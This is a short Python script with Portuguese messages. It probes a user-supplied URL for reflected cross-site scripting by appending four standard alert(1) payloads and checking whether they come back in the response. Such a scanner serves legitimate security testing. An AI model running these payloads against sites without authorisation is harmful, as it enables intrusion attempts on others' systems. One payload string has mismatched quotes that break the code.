import requests

payloads = [
    "<script>alert(1)</script>",
    "'"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>"
]

def test_xss(url):
    print(f"🔍 Testando XSS em: {url}")
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            res = requests.get(test_url, timeout=5)
            if payload in res.text:
                print(f"[💥] POSSÍVEL XSS DETECTADO com payload: {payload}")
            else:
                print(f"[✔️] Payload testado: {payload}")
        except Exception as e:
            print(f"[!] Erro ao testar payload: {payload} — {e}")

if __name__ == "__main__":
    target = input("Informe a URL vulnerável (ex: https://site.com/vuln?q=): ")
    test_xss(target)
